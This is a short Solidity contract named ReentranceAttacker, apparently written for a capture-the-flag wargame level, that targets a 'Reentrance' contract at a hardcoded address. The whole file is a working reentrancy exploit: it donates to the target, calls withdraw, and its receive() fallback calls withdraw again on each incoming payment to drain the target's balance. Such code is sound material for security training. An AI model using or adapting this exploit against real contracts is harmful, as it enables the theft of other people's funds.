pragma solidity ^0.8.0;

interface Reentrance {
  function donate(address _to) external payable;
  function withdraw(uint _amount) external ;
}

contract ReentranceAttacker {
  Reentrance reentranceContract = Reentrance(0xD2D776f42f06000a0503b871011De52e080c3Ae7);

  function donate() public payable {
    reentranceContract.donate{value: msg.value}(msg.sender);
  }

  function withdraw(uint _amount) public {
    reentranceContract.withdraw(_amount);
  }

  receive() external payable { 
    withdraw(msg.value);
  }
}